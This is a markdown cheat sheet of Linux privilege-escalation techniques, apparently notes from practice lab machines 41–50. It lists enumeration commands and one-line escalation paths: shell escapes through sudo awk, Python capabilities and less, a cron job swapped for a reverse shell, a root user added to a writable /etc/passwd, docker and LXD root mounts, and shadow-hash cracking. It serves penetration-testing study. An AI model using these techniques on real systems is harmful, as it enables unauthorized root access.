## 🛡️ Privilege Escalation (Machines 41–50)

```bash
# General enumeration
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
pspy64 / pspy32                      # Process monitoring for unusual activity
```

### Common Techniques
```bash
# Sudo abuse
sudo <binary>                       # Check if user has NOPASSWD access

# SUID binaries
/path/to/suid_binary                # Custom exploit or GTFOBins method

# Writable scripts / cronjobs
ls -la /etc/cron*                   # Look for writable cron jobs
```

### Kernel Exploits
```bash
uname -a
searchsploit Linux Kernel <version>
# Example: Dirty Pipe or Dirty Cow exploitation
```

---

### Example Escalation Paths from Machines 41–50

- **Machine 41:** Sudo NOPASSWD for `/usr/bin/awk` → `sudo awk 'BEGIN {system("/bin/bash")}'`
- **Machine 42:** SUID binary `/usr/local/bin/custom-suid` allowed shell escape
- **Machine 43:** Cron job writing to a script as root — user replaced it with bash reverse shell
- **Machine 44:** Capabilities set on Python binary — `cap_setuid+ep` → `python -c 'import os; os.setuid(0); os.system("/bin/bash")'`
- **Machine 45:** Writable `/etc/passwd` file allowed inserting new root user
- **Machine 46:** User had access to `journalctl` with `less` escape → `!bash`
- **Machine 47:** Exposed docker socket → mounted host root filesystem
- **Machine 48:** LXD group member → created container with mounted root → gained root
- **Machine 49:** Password reused in `/etc/shadow`, cracked with `john`
- **Machine 50:** SSH key reuse across users → gained access to root account
